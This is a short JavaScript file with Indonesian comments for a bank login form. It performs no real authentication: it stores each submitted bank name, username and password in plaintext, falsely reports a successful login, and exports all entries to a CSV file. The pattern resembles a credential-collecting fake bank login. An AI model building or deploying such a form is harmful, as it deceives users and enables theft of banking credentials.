const data = [];

// Menangani pengiriman form login
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah pengiriman form default

    const bank = document.getElementById('bank').value;
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    if (bank && username && password) {
        // Simpan data ke array
        data.push({ timestamp: new Date().toISOString(), bank, username, password });

        alert('Login berhasil dan data disimpan.');
    } else {
        const errorMessage = document.getElementById('error-message');
        errorMessage.textContent = 'Semua field harus diisi!';
        errorMessage.style.color = 'red';
        errorMessage.style.display = 'block';
    }
});

// Menangani klik tombol download CSV
const btnDownloadCsv = document.getElementById("btnDownloadCsv");

btnDownloadCsv.addEventListener("click", () => {
    if (data.length === 0) {
        alert('Tidak ada data untuk diunduh.');
    } else {
        const csvData = json2csv.parse(data);
        downloadCsv("Barbardocuments.csv", csvData);
    }
});

// Fungsi untuk mengunduh CSV
function downloadCsv(filename, csvData) {
    const element = document.createElement("a");

    element.setAttribute("href", `data:text/csv;charset=utf-8,${encodeURIComponent(csvData)}`);
    element.setAttribute("download", filename);
    element.style.display = "none";

    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
}
